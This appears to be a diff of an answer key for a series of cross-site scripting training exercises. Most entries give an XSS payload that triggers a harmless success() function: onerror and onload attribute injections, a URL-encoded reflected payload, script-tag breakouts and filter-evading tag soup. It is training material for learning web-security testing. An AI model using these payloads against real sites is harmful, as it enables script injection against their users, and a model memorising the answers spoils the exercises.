@@ -21,20 +21,28 @@ Exercise 6 – A Picture is Worth a Thousand Words
 
 Exercise 7 – Between a Rock And a Hard Place
         <button onClick="success()">Submit</button>
+
 Exercise 8 – Angle of Death
         <!--<img src="--><img src=x onerror=javascript:success()//">
+
 Exercise 10 – In the Wrong Place at the Wrong Time
         "<img src=/ onerror="success()" />
+
 Exercise 11 – You Can't Win 'em All
         "" onerror="success()"
+
 Exercise 12 – When All is Said and Done
         ' onload=success()
+
 Exercise 14 – Here Today and Gone Tomorrow
         http://caloogle.xyz:4120/search?q=%27+onload%3D%27success%28%29%27
+
 Exercise 15 – The Early Bird Catches the Worm
         </script> <img src=/ onerror=success() /> <script>
+
 Exercise 16 – Tying Up Loose Ends
         <<<///scrip<<//script>>t>>><img src =q onerror=success()>
+
 Exercise 17 – Take a Page Out of Their Book
         function send(payload) {
     fetch('/comment', {
